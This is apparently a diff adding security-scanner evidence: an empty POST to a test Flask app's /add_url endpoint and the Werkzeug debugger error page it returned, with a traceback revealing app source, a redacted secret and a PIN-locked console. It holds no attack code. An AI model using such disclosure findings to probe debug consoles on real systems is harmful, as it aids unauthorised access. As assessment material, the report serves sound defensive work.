+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388496&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388384&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388272&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388720&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661387152&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;28&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;add_url&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/add_url&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def add_url():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;url = request.form[&amp;#39;url&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;response = check_url(url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;print(response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if &amp;#39;200&amp;#39; in response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;new_url = URL(url=url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;db.session.add(new_url)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388832&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;196&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__getitem__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if key in self:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;lst = dict.__getitem__(self, key)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if len(lst) &amp;gt; 0:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;return lst[0]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;raise exceptions.BadRequestKeyError(key)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def __setitem__(self, key, value):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Like :meth:`add` but removes an existing key first.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;:param key: the key for the value.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/ul&gt;
+  &lt;blockquote&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;plain&quot;&gt;
+    &lt;p&gt;
+      This is the Copy/Paste friendly version of the traceback.
+    &lt;/p&gt;
+    &lt;textarea cols=&quot;50&quot; rows=&quot;10&quot; name=&quot;code&quot; readonly&gt;Traceback (most recent call last):
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &amp;#34;/app/app.py&amp;#34;, line 28, in add_url
+    url = request.form[&amp;#39;url&amp;#39;]
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&amp;#34;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/textarea&gt;
+&lt;/div&gt;
+&lt;div class=&quot;explanation&quot;&gt;
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  &lt;span class=&quot;nojavascript&quot;&gt;
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.&lt;/span&gt;
+&lt;/div&gt;
+      &lt;div class=&quot;footer&quot;&gt;
+        Brought to you by &lt;strong class=&quot;arthur&quot;&gt;DON'T PANIC&lt;/strong&gt;, your
+        friendly Werkzeug powered traceback interpreter.
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;pin-prompt&quot;&gt;
+      &lt;div class=&quot;inner&quot;&gt;
+        &lt;h3&gt;Console Locked&lt;/h3&gt;
+        &lt;p&gt;
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        &lt;form&gt;
+          &lt;p&gt;PIN:
+            &lt;input type=text name=pin size=14&gt;
+            &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!--
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &quot;/app/app.py&quot;, line 28, in add_url
+    url = request.form['url']
+  File &quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'url'
+
+
+--&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wa4zu-2w</code> — <code>artifacts/_/ev-mr2wa4zu-2w/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+connection: close
+content-length: 15055
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:38:06 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;BadRequestKeyError&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661387936&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389168&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389056&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389280&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
